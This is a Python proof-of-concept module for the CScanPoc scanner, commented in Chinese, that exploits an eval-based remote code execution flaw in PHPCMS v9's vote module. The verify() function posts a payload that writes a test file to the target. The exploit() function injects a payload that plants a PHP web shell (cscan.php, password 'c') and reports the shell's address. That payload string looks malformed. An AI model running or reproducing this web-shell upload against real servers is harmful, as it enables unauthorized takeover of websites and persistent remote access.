# coding: utf-8
import urllib

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0014'  # 平台漏洞编号，留空
    name = 'PHPCMS 前台任意代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-04-24'  # 漏洞公布时间
    desc = '''
        PHPCMS采用PHP5+MYSQL做为技术基础进行开发。9采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。 5年开发经验的优秀团队，在掌握了丰富的WEB开发经验和CMS产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达10万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。
        phpcms v9 中 string2array()函数使用了eval函数，在多个地方可能造成代码执行漏洞。
        /phpsso_server/phpcms/libs/functions/global.func.php
    '''  # 漏洞描述
    ref = 'https://pediy.com/thread-202263.htm'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'php<5.3'  # 漏洞应用版本


hh = hackhttp.hackhttp()


def get_vote_links(args):
    vul_url = args
    vote_url = '%s/index.php?m=vote' % vul_url
    code, head, res, _, _ = hh.http(vote_url)
    ids = []
    for miter in re.finditer(r'<a href=.*?subjectid=(?P<id>\d+)', res, re.DOTALL):
        ids.append(miter.group('id'))
    if len(ids) == 0:
        return None
    return list(set(ids))


class Poc(ABPoc):
    poc_id = '76c96343-6a27-46a3-9ab0-84f327292424'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            args = self.target
            vul_url = args
            ids = get_vote_links(args)
            if ids:
                for i in ids:
                    exploit_url = '%s/index.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % (
                        vul_url, i)
                    payload = {'subjectid': 1,
                               'radio[]': ');fputs(fopen(base64_decode(Y3NjYW4ucGhw),w),"vulnerable test");'}
                    post_data = urllib.parse.urlencode(payload)
                    hh.http('-d "%s" %s' % (post_data, exploit_url))
                    verify_url = '%s/index.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % (
                        vul_url, i)
                    hh.http(verify_url)
                    shell_url = '%s/cscan.php' % vul_url
                    code, head, res, _, _ = hh.http(shell_url)
                    if code == 200 and 'vulnerable test' in res:
                        # security_hole(vul_url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            pass

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            args = self.target
            vul_url = args
            ids = get_vote_links(args)
            if ids:
                for i in ids:
                    exploit_url = '%s/index.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % (
                        vul_url, i)
                    payload = {'subjectid': 1,
                               'radio[]': ');fputs(fopen(base64_decode(Y3NjYW4ucGhw),w),"vulnerable test"<?php @eval($_POST[c);?>);'}
                    post_data = urllib.parse.urlencode(payload)
                    hh.http('-d "%s" %s' % (post_data, exploit_url))
                    verify_url = '%s/index.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % (
                        vul_url, i)
                    hh.http(verify_url)
                    shell_url = '%s/cscan.php' % vul_url
                    code, head, res, _, _ = hh.http(shell_url)
                    if code == 200 and 'vulnerable test' in res:
                        # security_hole(vul_url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                            target=self.target, name=self.vuln.name, url=shell_url))
            pass

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
